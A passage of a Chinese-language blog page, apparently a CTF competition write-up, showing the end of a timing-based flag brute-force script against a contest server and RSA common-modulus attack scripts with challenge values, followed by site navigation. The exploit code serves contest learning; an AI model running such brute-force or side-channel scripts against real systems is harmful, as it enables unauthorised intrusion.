&#x3D; []</span><br><span class="line">while(1):</span><br><span class="line">    for c in range(32, 127):</span><br><span class="line">        p &#x3D; remote(&quot;8.131.246.36&quot;,40334)#nc 8.131.246.36 40334    </span><br><span class="line">        pwn(p, idx, c)</span><br><span class="line">        start &#x3D; time.time()</span><br><span class="line">        try:</span><br><span class="line">            p.recv(timeout&#x3D;2)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        end &#x3D; time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        if end-start &gt; 1.5:</span><br><span class="line">            var_list.append(c)</span><br><span class="line">            print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br><span class="line">        break</span><br><span class="line">    idx &#x3D; idx + 1</span><br><span class="line"> </span><br><span class="line">print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br></pre></td></tr></table></figure>
+<p>经过多次失败的爆破后<br>终于有了一个完整的</p>
+<p><img src="https://uploader.shimo.im/f/UKIa2isXiV4pTpyX.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="common-modulus"><a href="#common-modulus" class="headerlink" title="common_modulus"></a>common_modulus</h2><p>先用共模，算出HINT</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 共模攻击</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii as B</span><br><span class="line">n &#x3D; 781036391323974008856551441504551844841173384369055361767143425092387727015642055181741701170017399241497120632344953499820518820132068694764700867696829033106666055030180813062993649803797649124562825632340854157269454042167398954816966758408050707394510052574354703514670567409229754892812751190528559839163370996270173354192391025119212070374345175232268160015709412770236244184407603397493657886160301984598114022346065772036916080039069065703045460825584095559014098364274915486192890077441915702648662247422573607141301387160468708901332801070000950051880674436952646199048944681743156311156561347137284309444428161898926050856612636204505753959646608899803680618195914959490447723147711810217755931778569656715879355497741337867486596084617334222360877256151925248867366886699774397369843538784086757551124956184373578870266105742924242667575610284091444010308038579594247922368368398449676635147254244680714381600463229849534333608407292776731721661271718860696451810720187133868564530559847589151122364073467586981976649022363672800597675920485113168688814933825793827901051904388778126030212255351752567066602576348655685594872269975311829268026394327948942096118152848379484736487085060738082253125862183108996724624059293</span><br><span class="line">c1 &#x3D; 369574840235539108372094092254419274246554984982221252273253594183836400022960378170488757871945636102709146100003103420983393418895920944769809509498534206740321414394214836818668536994868508542980403916810808297197199669370712797146359430162012897117686984913530312098913792383741034334686281360853026726954824577914039860820382688425141138202072956110821496285690037742234810972548140439615644523558778763893381916419169521655893103187028705326557465586164413430726626576639348603638806511311706975958593200898505048876740706947195874397909272772688774998312506679360257618176951770041342256209410863260884750487279961933541672586237719402972217492287549068766414410155714303648473676009661943965293501994978200745219593293552499364219563185093112256120550663818918964081980469288619926291250638450874316053326601032273087039376723415701554676257043515877013761681843885375325430297941942692679848107999743068109805325264735576658206199089491608087442001508062053843516431089207243339447049547611183815785864081653492970812961076181422434762137310522146572918571492263273382927468586853431581811297567337244729976259333642991615934568219783998183005087012034016783535060297367475598352120058322912068079704771685886066199702963018</span><br><span class="line">c2 &#x3D; 401003748149510002818767369230254602513865159661339906800347290711690807270702301230624025422831311596632795141531720435002853738573163182312453127686259756779068482529257900103967550779067445990067902733048774414790636519587265122992946230937925359967091172504901407334687520803755214564929157748817222608867504984640435317237940989728715980606596332309938083583162432506373976839198105889860716728175207628676903581344807944755695848151190623498753010294323617338270060040423742010145259129678264662465355879341730120526032229944482388360258216424682694404263498956947130580056839592840962191604893632645585505577517647817952448510353267629549246776809657021963707309740084072731429860522801140021375078140454523473108229522456529438036963702296406101462856177037427008765522302625128434931680973911239443952409966616788095217782552153170772137807287594897681855045237814736536800205438589010668545647972935172419082314572196606656703628418159952436419223060565888253991481370307426542468001783829259332035534414470988788183383528642038979811899061182916422795902465788443785184461640800074642736248613386467596765647696764766509793194318458994279346191732415463226129676210488158303216826287374744132977258018064709541279591219801</span><br><span class="line">e1 &#x3D; 321959</span><br><span class="line">e2 &#x3D; 250261</span><br><span class="line">s0, s1, s2 &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line">if s1 &lt; 0:</span><br><span class="line">    s1 &#x3D; -s1</span><br><span class="line">    c1 &#x3D; gmpy2.invert(c1, n)</span><br><span class="line">elif s2 &lt; 0:</span><br><span class="line">    s2 &#x3D; -s2</span><br><span class="line">    c2 &#x3D; gmpy2.invert(c2, n)</span><br><span class="line">m &#x3D; gmpy2.powmod(c1, s1, n)*gmpy2.powmod(c2, s2, n) % n</span><br><span class="line">m &#x3D; gmpy2.iroot(m,11)[0]</span><br><span class="line">print(&#39;[-]m is:&#39;, m)</span><br><span class="line">print(hex(m))</span><br><span class="line">print( B.a2b_hex(hex(m)[2:]))</span><br></pre></td></tr></table></figure>
+<p><img src="https://uploader.shimo.im/f/8JFCib49NLzjrsj3.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">hint &#x3D; 0x65333d3338363332312c65343d323136343337</span><br><span class="line"></span><br><span class="line">n2 &#x3D; 829153922415855137264800234822397159517330834702889033537933377293887344320377111020468975059392957737449202237724182178497515850669969287557171761512943313347002707881627665997773538338624697031113180118787578098839812766590356161880633390491240275263405375614880514319024910802488825931065452764114707860207310201420715597319258880485040522551832971592910421789656655281398336391483665797851843030704262677198876702546809063670714197016598069553974073602743894202215033991282795559558580509644985355582265309273819085165244990507821708921430055578522701525123887916901778357465509369586730929688392667732886906857430517653096398002777964560127268121571049233223372798710275104635615146227690965482270801899538594859206469480776522613028131598888508457709453379574742196454867003503347438618445660900423827776062276496733498823286497376761412579384984369308185260156963156405659950843672893896087650002269874800953868406307954077672988900057904666430054296760155287271561170025767624003816826720442668295925485637633877652749338842612472516105683964067019360513619412986301224461318521372012905629559424109846511589009550745828509068711532135188012958609344134355466641890243263881890822508445307982892951553198862583429368670057993</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c3 &#x3D; 159724515943626607063077852180725785535830882720862727668525327462548399711146109134244815376287134761817075519820142556357574606798840233562248755971526219627762223734393473798914901143269449212790392600105330383090174083139586064181174009077350924651070244802047181675971743583126005374180803661344948105563731243622231745397860438110568700027808240466520775159603948893458839584686022713865445974999010633338992077036339635470928309825709158252021736998333181626196852117911063143924690274341118934263954401171980866857766803251097624531349328131906037324939822709718110584612723905396082816423636920021116198893529151233844741049768382997165306708386377461537659894631638669541135139772256724755879894163220385702448163577861050255922091076291360733371557008202704744025308442559929057280944151904346146363641694256384699833066941693911888313063101709464779564216471784300409758667075242519216711038178970244130709075948085377075896223268673956328949049096893114349123857314470200317354442002350914580896785644057370606138149403529271049952702755513806243257608741081761103014849775297798769123025294190124352059867893341310583345698551198662911063194743695473937982189580136904500546179872911907699655901666991491654421172959264</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c4 &#x3D; 577539997913679548128771306860581210544436789252901226997329423745523775309125445697836728285902404228772238261978792894724035857571722732772392975266650638941506233731097966088599219553016910895407298319171601788682316820727521975802034842881641332176636880671926669677709251368489592049188264858974171362799051918792714121517422464840766220636795897542591062529334135365684855298036787805819982776703613397951208027499626161971540340384357517350954755917853981444696889490414620688922414306470663625107920255478295871212500731262906706677230231273773081082937699900897018507666959617262265778895830665231960626623936539619558323350031200046331865204833002387826480300556398975518044660453862186191885052104669182124205562629260585502282489936369132703221625792917684714281278526690498041768698231671538540231217204457920089132127615505206718241082416584911313565380784068494321438301994932115301961956898936006101799945175006847294491423172988371831199816110394796146842726192613950900507852084712888550397657990358471172662866403096061418272111461743199683739447289005311734544421847876133462236161463005728810728422873087670552019575195179400831748068699257581271088746550021722434317091260496556373742562805426688588980981788900</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c &#x3D;795129169552291006861754002206513820937641980698434382418936261423422746999612445764303059674219208389574024534672717069821412414159146551366545996353949783196010213553918927580779995019174186191032145333149188913037471190229239099846321485033232436935611571367541493044277081533408993875257311753734536147571167095896669077719414131452331046090464837590749820091009158875152457888900355791540044943189887475311977641143538035689663891597983971260327156044023687896426055728061855343985242964248584312808777178962375936043822201018415653235814485615205327407400780005852561278683155208683364942051067379779866515199199129202240010485952950728372189222715041921342651574061028219342292107006496306690996248232154011982638406599183117999624463176008864712361084026607499225962202418264921259296412132569498420948156231991422121967643470934361208982842203404876002586976855763264989245461870293707215153833855463524713435447265274151395156396029507394842810440848947409747692940663271981830686236597905086310965497295634452454502792579750856566644956428398186959955662345052899355866818276388556869309837579415317436154415391396745002015389421807844666877314560257175276506064197678141334956984552068148598923249237123558477833149102400</span><br><span class="line">e3&#x3D;386321</span><br><span class="line">e4&#x3D;216437</span><br><span class="line">s0, s1, s2 &#x3D; gmpy2.gcdext(e3, e4)</span><br><span class="line">if s1&lt;0:</span><br><span class="line">	s1 &#x3D; - s1</span><br><span class="line">	c3 &#x3D; gmpy2.invert(c3, n2)</span><br><span class="line">elif s2&lt;0:</span><br><span class="line">	s2 &#x3D; - s2</span><br><span class="line">	c4 &#x3D; gmpy2.invert(c4, n2)</span><br><span class="line">	c &#x3D; pow(c3,s1,n2)*pow(c4,s2,n2) % n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a &#x3D; gmpy2.invert(hint**13,n2)</span><br><span class="line">d &#x3D; (c*a)%n2</span><br><span class="line">flag &#x3D; gmpy2.iroot(d,13)[0]</span><br><span class="line">print long_to_bytes(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://uploader.shimo.im/f/eds6YkgkgyutXsUr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://sharun.xyz">sharun</a>
+            <p>原文链接：<a href="http://sharun.xyz/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/">http://sharun.xyz/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/</a>
+            <p>发表日期：<a href="http://sharun.xyz/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/">January 1st 2021, 10:17:40 am</a>
+            <p>更新日期：<a href="http://sharun.xyz/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/">January 1st 2021, 10:17:51 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/04/22/linux%20%E7%9A%84%20log%20%E6%96%87%E4%BB%B6/" title= "linux中log取证">
+                    <div class="nextTitle">linux中log取证</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/11/09/Volatility/" title= "volatility">
+                    <div class="prevTitle">volatility</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:503298621@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/roshines" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">1.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">login：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login2"><span class="toc-number">1.3.</span> <span class="toc-text">login2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-1"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC%E9%9A%90%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">MISC隐写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QAQ-pcap"><span class="toc-number">4.3.</span> <span class="toc-text">QAQ_pcap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn1"><span class="toc-number">5.1.</span> <span class="toc-text">Pwn1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">6.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#common-modulus"><span class="toc-number">6.1.</span> <span class="toc-text">common_modulus</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">7.</span> <span class="toc-text">re</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 28
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2020/11/09/%E9%93%81%E4%B8%89-WP/" >铁三-WP</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/11/09/Volatility/" >volatility</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2021/04/22/linux%20%E7%9A%84%20log%20%E6%96%87%E4%BB%B6/" >linux中log取证</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2020/11/02/cnblog_13913331/" >湖湘杯-MISC-WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2020/08/21/cnblog_13542994/" >爆炒腰花-2020国赛WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2020/08/16/cnblog_13514707/" >HWS选拔赛-MISC</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2020/08/16/cnblog_13514165/" >爆炒腰花-蓝帽杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2020/07/26/cnblog_13381598/" >Lun4R-CyBRICSCTF wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2020/07/25/cnblog_13378245/" >Lun4R-dasctf MISC1 welcome</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2020/07/24/cnblog_13374692/" >计网小笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2020/07/17/cnblog_13331754/" >数据恢复之FAT和NTFS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2020/06/06/cnblog_13054815/" >HSCTF  WP   ——Lun4R</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2020/05/19/cnblog_12919431/" >服务器运维抓包练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2020/05/16/cnblog_12900273/" >2020网鼎杯青龙组 MISC 虚幻2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2020/05/16/cnblog_12898784/" >2020网鼎杯白虎组 MISC 密码柜（未解出）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span><a class="archive-post-title" href= "/2020/04/26/cnblog_12781871/" >安恒四月春季赛 MISC keyboard</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2020/04/19/cnblog_12733364/" >虎符ctf-MISC-奇怪的组织(看完官方题解，找到了)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2020/03/11/cnblog_12465071/" >jarvisoj MISC 取证2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/cnblog_12455527/" >usb</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2020/03/05/cnblog_12420367/" >n赛 ML 第一步（python解决）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href= "/2020/03/04/cnblog_12411264/" >CTFHub web技能树 RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2020/03/02/cnblog_12397873/" >快捷指令写爬虫程序</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2020/03/02/cnblog_12395416/" >ios快捷指令编程尝试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2020/03/01/cnblog_12389284/" >n赛 内存取证题解（已更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2020/02/10/cnblog_12290724/" >awd平台搭建</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/11</span><a class="archive-post-title" href= "/2019/06/11/cnblog_11001628/" >文件检测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2019/05/16/cnblog_10875920/" >bugku ctf 逆向题</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="WP"><span class="iconfont-archer">&#xe606;</span>WP</span>
+    
+        <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
+    
+        <span class="sidebar-tag-name" data-tags="forensic"><span class="iconfont-archer">&#xe606;</span>forensic</span>
+    
+        <span class="sidebar-tag-name" data-tags="博客园"><span class="iconfont-archer">&#xe606;</span>博客园</span>
+    
+        <span class="sidebar-tag-name" data-tags="搬家"><span class="iconfont-archer">&#xe606;</span>搬家</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="WP"><span class="iconfont-archer">&#xe60a;</span>WP</span>
+    
+        <span class="sidebar-category-name" data-categories="MISC"><span class="iconfont-archer">&#xe60a;</span>MISC</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "sharun"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
